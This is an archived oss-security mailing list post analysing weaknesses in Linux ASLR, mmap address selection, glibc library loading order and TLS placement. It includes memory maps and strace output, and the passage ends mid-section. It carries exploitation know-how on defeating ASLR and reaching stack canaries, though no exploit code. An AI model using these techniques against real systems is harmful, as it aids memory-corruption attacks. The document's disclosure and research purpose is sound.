X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["58915" "Tuesday" "27" "February" "2018" "18:11:53" "+0300" "Ilya Smith" "blackzert@gmail.com" "<A96CC2FE-84FA-4B84-965A-3ED03F60B990@gmail.com>" "1514" "[oss-security] New bypass and protection techniques for ASLR on Linux" nil nil nil "2" "2018022715:11:53" "[oss-security] New bypass and protection techniques for ASLR on Linux" (number mark "U       blackzert@gm Feb 27 1514/58915 " thread-indent "\"[oss-security] New bypass and protection techniques for ASLR on Linux\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7460 invoked by uid 550); 27 Feb 2018 15:23:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31846 invoked from network); 27 Feb 2018 15:12:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:content-transfer-encoding:mime-version:subject:message-id:date
         :to;
        bh=tJxLxAJmfEk7yOIiK9jRfxPJY32d36run35bEPuhf8U=;
        b=s6Jd+e9ZCa/dEIM1dDnevz9eXYDq01W/m84ItlYLl4DFdLdgqh5WBb07e7wFfF5hCt
         LnK5zlvOzALgA9xPyQip4aI7eQXZ8l4R/EPL9Pgm4dXRNBqqRHzcO1At4uV4r69JHaMq
         TeeS7Rq1DY9JW1+RU691Zdp/zLCYGnjB7/dV9+8BBN7JEsskf1I0R9lZPnujQIpRSyux
         aX3ranqH+/4J64B75qDuNeG/wGzHN9mFaNwPPnYX9oNUbbXRToBzrKvapVc1ga0bQ6eJ
         y0lEa2RHjzC+9z0ux4xqrIijp8yhPAUoL4/M4kZIzUrQ0pBrlWjFH88gzJzfeU3psSJE
         OQEg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:content-transfer-encoding:mime-version
         :subject:message-id:date:to;
        bh=tJxLxAJmfEk7yOIiK9jRfxPJY32d36run35bEPuhf8U=;
        b=oq2kg23cJYK6Bozhd87WrZEOL3qFm9Yk2bSm+eNFH1FFC4gP3fSNZF2CLCkrrE9LSf
         6P/2xTzw3kjS4Vp+W4Fed3NMN6ICbBRMwTc6rTm7OAPkJWRx7pUE6Exh/BfDAghoLGV4
         VkNCuamEo0UAo3ILtCknQlpfHuqlYMylogYTY8uNxSCAc5sGrWuJrcDuyt0cs5yA9hWu
         7HrIMKPflTxHZ/Uq6tadWNXLjqgjIRxKgTUf4t7tTwPk4D7vPtFhNsHwf/FLhS/x9S3V
         dZCvgpq7egftc96XQ/oG9LIJShLzr2aOhTXdYk6tATiuJF1L5eZ6TTV0XCQ7muleY0Sl
         CuRA==
X-Gm-Message-State: APf1xPCODpSMA7LnrfT05pmNGHeBgB/PzbBSgRhb9v9emwQYEn8+ph3A
	QZcgE0sSDgSonRmcBVpO1Xl5k9h41EI=
X-Google-Smtp-Source: AG47ELvreFZFae2f+6+Lb90HumFomdNQ8sJHKVakpucI8DgF4PKLi2qvTqZae3c0lSEGJHfo/Xp5GQ==
X-Received: by 10.46.58.1 with SMTP id h1mr10168093lja.69.1519744316012;
        Tue, 27 Feb 2018 07:11:56 -0800 (PST)
From: Ilya Smith <blackzert@gmail.com>
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 11.2 \(3445.5.20\))
Message-Id: <A96CC2FE-84FA-4B84-965A-3ED03F60B990@gmail.com>
Date: Tue, 27 Feb 2018 18:11:53 +0300
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3445.5.20)
Subject: [oss-security] New bypass and protection techniques for ASLR on Linux

Hello everybody,

New bypass and protection techniques for ASLR on Linux

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

I. Introduction
II. Problems with current implementation
  II.1. Close proximity of memory location
  II.2. Fixed method of loading libraries
  II.3. Fixed order of execution
  II.4. Holes
  II.5. TLS and thread stack
  II.6. malloc and mmap
  II.7. MAP_FIXED and loading of ET_DYN ELF files
  II.8. Cache of allocated memory
  II.9. thread cache alignment
III. Solutions
  III.1 Holes
  III.2 Order of loading ELF file segments=20
  III.3 Use of mmap_min_addr when searching for mmap allocation addresses=20
  III.4 mmap
IV. Related Work
V. References

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
I. Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Before begin, version info:
$ uname -a
Linux blackzert-virtual-machine 4.13.0-36-generic #40-Ubuntu SMP Fri Feb 16=
=20
20:07:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ ldd --version
ldd (Ubuntu GLIBC 2.26-0ubuntu2.1) 2.26

Everything said today also true for current version of linux Kernel - 4.16-=
rc3
and GNU Libc 2.27

This research started with a small command:
$ less /proc/self/maps

5607a1ae5000-5607a1b0b000 r-xp 00000000 08:01 1966152   /bin/less
5607a1d0a000-5607a1d0b000 r--p 00025000 08:01 1966152   /bin/less
5607a1d0b000-5607a1d0f000 rw-p 00026000 08:01 1966152   /bin/less
5607a1d0f000-5607a1d13000 rw-p 00000000 00:00 0=20
5607a3bf8000-5607a3c19000 rw-p 00000000 00:00 0         [heap]
7f4d147e7000-7f4d14bf4000 r--p 00000000 08:01 3016021   /usr/lib/locale/loc=
ale-archive
7f4d14bf4000-7f4d14dca000 r-xp 00000000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7f4d14dca000-7f4d14fca000 ---p 001d6000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7f4d14fca000-7f4d14fce000 r--p 001d6000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7f4d14fce000-7f4d14fd0000 rw-p 001da000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7f4d14fd0000-7f4d14fd4000 rw-p 00000000 00:00 0=20
7f4d14fd4000-7f4d14ff9000 r-xp 00000000 08:01 1185166   /lib/x86_64-linux-g=
nu/libtinfo.so.5.9
7f4d14ff9000-7f4d151f8000 ---p 00025000 08:01 1185166   /lib/x86_64-linux-g=
nu/libtinfo.so.5.9
7f4d151f8000-7f4d151fc000 r--p 00024000 08:01 1185166   /lib/x86_64-linux-g=
nu/libtinfo.so.5.9
7f4d151fc000-7f4d151fd000 rw-p 00028000 08:01 1185166   /lib/x86_64-linux-g=
nu/libtinfo.so.5.9
7f4d151fd000-7f4d15224000 r-xp 00000000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7f4d1540b000-7f4d15410000 rw-p 00000000 00:00 0=20
7f4d15424000-7f4d15425000 r--p 00027000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7f4d15425000-7f4d15426000 rw-p 00028000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7f4d15426000-7f4d15427000 rw-p 00000000 00:00 0=20
7ffdeb3ec000-7ffdeb40d000 rw-p 00000000 00:00 0         [stack]
7ffdeb41e000-7ffdeb421000 r--p 00000000 00:00 0         [vvar]
7ffdeb421000-7ffdeb423000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]

  - The base address of the binary application (/bin/less, in our case) is=
=20
5607a1ae5000.
  - The heap start address is 5607a3bf8000, being the address of the end of=
 the=20
binary application plus a random value, which in our case equals 0x1ee5000=
=20
(5607a3bf8000-5607a1d13000). The address is aligned to 2^12 due to the x86-=
64=20
architecture.
  - Address 7f4d15427000 is selected as mmap_base. The address will serve a=
s=20
the upper boundary when a random address is selected for any memory allocat=
ion=20
via the mmap system call.
  - Libraries ld-2.26.so, libtinfo.so.5.9, and libc-2.26.so are located=20
consecutively.

If subtraction is applied to the neighboring memory regions, we will note t=
he=20
following: there is a substantial difference between the binary file, heap,=
=20
stack, the lowest local-archive address, and the highest ld address. There =
is=20
not a single free page between the loaded libraries (files).

If we repeat the procedure several times, the picture will remain practical=
ly=20
the same: the difference between pages will vary, while libraries and files=
=20
will remain identical in location relative to one another. This fact will b=
e=20
crucial for our analysis.=20

Current mmap implementation is the reason of this behavior.

The logic is stored in the do_mmap kernel function, which implements memory=
=20
allocation both on the part of the user (mmap syscall) and on the part of t=
he=20
kernel (when executing execve). In the first stage, an available address is=
=20
selected ( get_unmapped_area); in the second stage, pages are mapped to tha=
t=20
address (mmap_region). We will start with the first stage.=20

The following options are possible when selecting an address:=20

  1. If the MAP_FIXED flag is set, the system will return the value of the =
addr=20
argument as the address.
  2. If the addr argument value is not zero, this value is used as a hint a=
nd,=20
in some cases, will be selected.=20
  3. The largest address of an available region will be selected as the=20
address, as long as it is suitable in length and lies within the allowed ra=
nge=20
of selectable addresses.
  4. The address is checked for security-related restrictions.

If all is successful, the region of memory at the selected address will be=
=20
allocated.=20

Details of address selection algorithm

The structure underlying the manager of process virtual memory is=20
vm_area_struct (or vma, for short):
=20=20
  struct vm_area_struct {
      unsigned long vm_start; /* Our start address within vm_mm. */
      unsigned long vm_end; /* The first byte after our end address
  within vm_mm. */
      ...
      /* linked list of VM areas per task, sorted by address */
      struct vm_area_struct *vm_next, *vm_prev;

      struct rb_node vm_rb;
      ...
      pgprot_t vm_page_prot; /* Access permissions of this VMA. */
      ...
  };

This structure describes the start of the virtual memory region, the region=
=20
end, and access flags for pages within the region.=20

vma is organized in a doubly linked list of region start addresses, in=20
ascending order, and also an augmented red-black tree of region start=20
addresses, in ascending order as well. A good rationale for this solution i=
s=20
given by the kernel developers themselves [1].

The red-black tree augment is the amount of available memory for a particul=
ar=20
node. The amount of available memory for a node is defined as whichever is =
the=20
highest of:
  - The difference between the start of the current vma and end of the=20
preceding vma in an ascending-ordered doubly linked list
  - Amount of available memory of the left-hand subtree=20
  - Amount of available memory of the right-hand subtree

This structure makes it possible to quickly search (in O(log n) time) for t=
he=20
vma that corresponds to a certain address or select an available range of a=
=20
certain length.=20

During the address selection process, two important boundaries are identifi=
ed=20
as well: the minimum lower boundary and the maximum upper boundary. The low=
er=20
boundary is determined by the architecture as the minimum allowable address=
 or=20
as the minimum value permitted by the system administrator. The upper=20
boundary=E2=80=94mmap_base=E2=80=94is selected as stack=E2=80=93random, whe=
re stack is the maximum=20
stack address while random is a random value with entropy of 28 to 32 bits,=
=20
depending on relevant kernel parameters. The Linux kernel cannot choose an=
=20
address higher than mmap_base. In the address space of the address process,=
=20
large mmap_base values either correspond to the stack and special system=20
regions (vvar and vdso), or will never be used unless explicitly marked wit=
h=20
the MMAP_FIXED flag.=20

So in this whole scheme, the following values remain unknown: the address o=
f=20
the start of the main thread stack, the base address for loading the=20
application binary file, the start address of the application heap, and=20
mmap_base, which is the starting address for memory allocation with mmap.=20

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II. Problems with current implementation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The memory allocation algorithm just described has a number of weaknesses.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.1. Close proximity of memory location
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

An application uses virtual RAM. Common uses of memory by an application=20
include the heap, code, and data (.rodata, .bss) of loaded modules, thread=
=20
stacks, and loaded files. Any mistake in processing the data from these pag=
es=20
may affect nearby data as well. As more pages with differing types of conte=
nts=20
are located in close proximity, the attack area becomes larger and the=20
probability of successful exploitation rises.=20

Examples of such mistakes include out-of-bounds [2], overflow (integer [3] =
or=20
buffer [4], and type confusion [5].=20

A specific instance of this problem is that the system remains vulnerable t=
o=20
the Offset2lib attack, as described in [6]. In short: the base address for=
=20
program loading is not allocated separately from libraries, yet the kernel=
=20
selects it as mmap_base. If the application contains vulnerabilities, it=20
becomes easier to exploit them, because library images are located in close=
=20
proximity to the binary application image.=20

A good example demonstrating this problem is a PHP vulnerability in [7] tha=
t=20
allows reading or altering neighboring memory regions.=20


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.2. Fixed method of loading libraries
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In Linux, dynamic libraries are loaded practically without calling the Linu=
x=20
kernel. The ld library (from GNU Libc) is in charge of this process. The on=
ly=20
way the kernel participates is via the mmap function (we will not yet consi=
der=20
open/stat and other file operations): this is required for loading the code=
 and=20
library data into the process address space. An exception is the ld library=
=20
itself, which is usually written in the executable ELF file as the interpre=
ter=20
for file loading. As for the interpreter, it is loaded by the kernel.=20

If ld from GNU Libc is used as the interpreter, libraries are loaded in a w=
ay=20
resembling the following:

  1. The program ELF file is added to the file queue for processing.
  2. The first ELF file is taken out of the queue (FIFO).
  3. If the file has not been loaded yet into the process address space, it=
 is=20
loaded with the help of mmap.
  4. Each library needed for the file in question is added to the queue of=
=20
files for processing.
  5. As long as the queue is not empty, repeat step 2.


This algorithm means that the order of loading is always determinate and ca=
n be=20
repeated if all the required libraries (their binary files) are known. This=
=20
allows recovering the addresses of all libraries if the address of any sing=
le=20
library is known:

  1. Assume that the address of the libc library is known.
  2. Add the length of the libc library to the libc loading address=E2=80=
=94this is the=20
loading address of the library that was loaded before libc.
  3. Continuing in the same manner, we obtain mmap_base values and addresse=
s of=20
the libraries that were loaded before libc.
  4. Subtract from the libc address the length of the library loaded after=
=20
libc. This is the address of the library loaded after libc.
  5. Iterating in the same manner, we obtain the addresses of all libraries=
=20
that were loaded at program start with the ld interpreter.


If a library is loaded while the program is running (for instance, via the=
=20
dlopen function), its position in relation to other libraries may be unknow=
n to=20
attackers in some cases. For example, this may happen if there were mmap ca=
lls=20
for which the size of allocated memory regions is unknown to attackers.

When it comes to exploiting vulnerabilities, knowledge of library addresses=
=20
helps significantly: for instance, when searching for gadgets to build ROP=
=20
chains. What's more, if any library contains a vulnerability that allows=20
reading or writing values relative to the library address, such a vulnerabi=
lity=20
will be easily exploited, since the libraries are sequential.=20

Most Linux distributions contain compiled packages with the most widespread=
=20
libraries (such as libc). This means that the length of libraries is known,=
=20
giving a partial picture of the distribution of virtual address space of a=
=20
process in such a case.=20

Theoretically, one could build a large database for this purpose. For Ubunt=
u,=20
it would contain versions of libraries including ld, libc, libpthread, and=
=20
libm; for each version of a library, multiple versions of libraries necessa=
ry=20
for it (dependencies) may be analyzed. So by knowing the address of one=20
library, one can know possible map versions describing the distribution of =
part=20
of the process address space.=20

Examples of such databases are libcdb.com and libc.blukat.me, which are use=
d to=20
identify libc versions based on offsets for known functions.=20

All this means that a fixed method of loading libraries is an application=20
security problem. The behavior of mmap, described in the previous section,=
=20
compounds the problem. In Android, this problem is solved in version 7 and=
=20
later [8] [9].=20

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.3. Fixed order of execution
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Programs have an interesting property: there is a pair of certain points in=
 the=20
execution thread between which the program state is predictable. For exampl=
e,=20
once a client has connected to a network service, the service allocates som=
e=20
resources to the client. Part of these resources may be allocated from the=
=20
application heap. In this case, the relative position of objects in the hea=
p is=20
usually predictable.=20

This property is useful for exploiting applications, by "building" the prog=
ram=20
state required by an attacker. Here we will call this state a fixed order o=
f=20
execution.=20

In some cases of this property, there is a certain fixed point in the threa=
d of=20
execution. At this point, from the start of execution, from launch to launc=
h,=20
the program state remains identical except for some variables. For example,=
=20
before the main function is executed, the ld interpreter must load and=20
initialize all the libraries and then initialize the program. As noted in=20
Section 4.2, the relative position of libraries will always be the same. Du=
ring=20
execution of the main function, the differences will consist in the specifi=
c=20
addresses used for program loading, libraries, stack, heap, and objects=20
allocated in memory. These differences are due to the randomization describ=
ed=20
in Section 6.=20

As a result, an attacker can obtain information on the relative position of=
=20
program data. This position is not affected by randomization of the process=
=20
address space.=20

At this stage, the only possible source of entropy is competition between=20
threads: if the program creates several threads, their competition in worki=
ng=20
with the data may introduce entropy to the location of objects. In this=20
example, creating threads before executing the main function is possible wi=
th=20
the help of the program global constructors or required libraries.=20

When the program starts using the heap and allocating memory from it (usual=
ly=20
with the help of new/malloc), the mutual position of objects in the heap wi=
ll=20
remain constant for each launch up to a certain moment.=20

In some cases, the position of thread and heap stacks will also be predicta=
ble=20
in relation to library addresses.=20

If needed, it is possible to obtain these offsets to use in exploitation. O=
ne=20
way is to simply execute "strace -e mmap" for this application twice and=20
compare the difference in addresses.=20

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.4. Holes
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

If an application allocates memory with mmap and then frees up part of that=
=20
memory, this can cause holes=E2=80=94free memory regions that are surrounde=
d by=20
occupied regions. Problems may come up if this free memory (hole) is again=
=20
allocated for a vulnerable object (a object during whose processing the=20
application demonstrates a vulnerability). This brings us back to the probl=
em=20
of closely located objects in memory.=20

One illustrative example of such holes was found in the code for ELF file=20
loading in the Linux kernel. When loading the ELF file, the kernel first re=
ads=20
the size of the file and tries to map it in full via do_mmap . Once the fil=
e=20
has been fully loaded, the memory after the first segment is freed up. All=
=20
following segments are loaded at a fixed address ( MAP_FIXED) that is set=20
relative to the first segment. All this is needed in order to load the enti=
re=20
file at the selected address and separate segments by rights and offsets in=
=20
accordance with their descriptions in the ELF file. This approach can cause=
=20
memory holes if the holes were present in the ELF file between segments.=20
In the same situation, during loading of an ELF file, the ld interpreter (G=
NU=20
Libc) does not call unmap but changes permissions for the free pages (holes=
) to=20
PROT_NONE, which forbids the process from having any access to these pages.=
=20
This approach is more secure.=20

To show impact of that problem start with following command:
$ strace -e mmap,munmap,open,openat,arch_prctl -f cat /proc/self/maps

openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) =3D 3
mmap(NULL, 79806, PROT_READ, MAP_PRIVATE, 3, 0) =3D 0x7fa5fd8bc000
...
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =
=3D=20
0x7fa5fd8ba000
arch_prctl(ARCH_SET_FS, 0x7fa5fd8bb500) =3D 0
munmap(0x7fa5fd8bc000, 79806)           =3D 0
...
openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) =3D 3
mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =
=3D=20
0x7fa5fd898000
...

560d3c3e5000-560d3c3ed000 r-xp 00000000 08:01 1966104   /bin/cat
560d3c5ec000-560d3c5ed000 r--p 00007000 08:01 1966104   /bin/cat
560d3c5ed000-560d3c5ee000 rw-p 00008000 08:01 1966104   /bin/cat
560d3e00b000-560d3e02c000 rw-p 00000000 00:00 0         [heap]
7fa5fcebc000-7fa5fd2c9000 r--p 00000000 08:01 3016021   /usr/lib/locale/loc=
ale-archive
7fa5fd2c9000-7fa5fd49f000 r-xp 00000000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7fa5fd49f000-7fa5fd69f000 ---p 001d6000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7fa5fd69f000-7fa5fd6a3000 r--p 001d6000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7fa5fd6a3000-7fa5fd6a5000 rw-p 001da000 08:01 1179731   /lib/x86_64-linux-g=
nu/libc-2.26.so
7fa5fd6a5000-7fa5fd6a9000 rw-p 00000000 00:00 0=20
7fa5fd6a9000-7fa5fd6d0000 r-xp 00000000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7fa5fd898000-7fa5fd8bc000 rw-p 00000000 00:00 0=20
7fa5fd8d0000-7fa5fd8d1000 r--p 00027000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7fa5fd8d1000-7fa5fd8d2000 rw-p 00028000 08:01 1179654   /lib/x86_64-linux-g=
nu/ld-2.26.so
7fa5fd8d2000-7fa5fd8d3000 rw-p 00000000 00:00 0=20
7ffc0a6bc000-7ffc0a6dd000 rw-p 00000000 00:00 0         [stack]
7ffc0a730000-7ffc0a733000 r--p 00000000 00:00 0         [vvar]
7ffc0a733000-7ffc0a735000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
munmap(0x7fa5fd898000, 139264)          =3D 0
+++ exited with 0 +++

Here file "/etc/ld.so.cache" mmaped to the hole inside ld-2.26.so with addd=
ress=20
0x7fa5fd8bc000. Later mmap is called to get 0x7fa5fd8ba000 address with siz=
e=20
8192. This range contain TCB (thread control block) structure of main threa=
d,=20
set with arch_prctl(ARCH_SET_FS, 0x7fa5fd8bb500). Before 'main' function of=
=20
'cat' programm called, 0x7fa5fd8bc000 is unmapped leaving another one hole =
-=20
between TCB and ld read-only segment.=20

These two holes:
  1. between ld .text and 0x7fa5fd8ba000 what is used for TCB
  2. between 0x7fa5fd8bc000 (what is end of TCB) and ld .rdonly
might be used to bypass ASLR, if attacker do mmap vulnerable object in thes=
e=20
holes (only appropriated size needed to do so) and use read/write out-of-bo=
unds=20
vulnerabilities to get access to ld data or TCB or any other library data.

As example '/self/proc/maps' itself mmapped in the hole - 0x7fa5fd898000.
Another one way to mmap there is call malloc with big size - in this case g=
libc=20
call mmap.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.5. TLS and thread stack
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Thread Local Storage (TLS) is a mechanism whereby each thread in a multithr=
ead=20
process can allocate locations for data storage [10]. The mechanism is=20
implemented differently on different architectures and operating systems. I=
n=20
our case, this is the glibc implementation under x86-64. For x86, any=20
difference will not be material for the mmap problem in question.=20

In the case of glibc, mmap is also used to create TLS. This means that TLS =
is=20
selected in the way described already here. If TLS is close to a vulnerable=
=20
object, it can be altered.=20

What is interesting about TLS? In the glibc implementation, TLS is pointed =
to=20
by the segment register fs (for the x86-64 architecture). Its structure is=
=20
described by the tcbhead_t type defined in glibc source files:

  typedef struct
  {
    void *tcb;        /* Pointer to the TCB.  Not necessarily the
                 thread descriptor used by libpthread.  */
    dtv_t *dtv;
    void *self;       /* Pointer to the thread descriptor.  */
    int multiple_threads;
    int gscope_flag;
    uintptr_t sysinfo;
    uintptr_t stack_guard;
    uintptr_t pointer_guard;
    ...
  } tcbhead_t;

This type contains the field stack_guard, which contains a so-called canary=
=E2=80=94a=20
random or pseudorandom number for protecting an application from stack=20
overflows [11].
This protection works in the following way: when a function is entered, a=20
canary obtained from tcbhead_t.stack_guard is placed on the stack. At the e=
nd=20
of the function, the stack value is compared to the reference value in=20
tcbhead_t.stack_guard. If the two values do not match, the application will=
=20
return an error and terminate.=20

Canaries can be bypassed in several ways:=20

  - If an attacker does not need to overwrite this value [12].
  - If an attacker has managed to read or anticipate this value, making it=
=20
possible to perform a successful attack [12].
  - If an attacker can overwrite this value with a known one, making it=20
possible to cause a stack overflow [12].
  - An attacker can take control before the application terminates [13].
  - The listed bypasses highlight the importance of protecting TLS from rea=
ding=20
or overwriting by an attacker.

Our research revealed that glibc has a problem in TLS implementation for=20
threads created with the help of pthread_create. Say that it is required to=
=20
select TLS for a new thread. After allocating memory for the stack, glibc=20
initializes TLS in upper addresses of this memory. On the x86-64 architectu=
re=20
considered here, the stack grows downward, putting TLS at the top of the st=
ack.=20
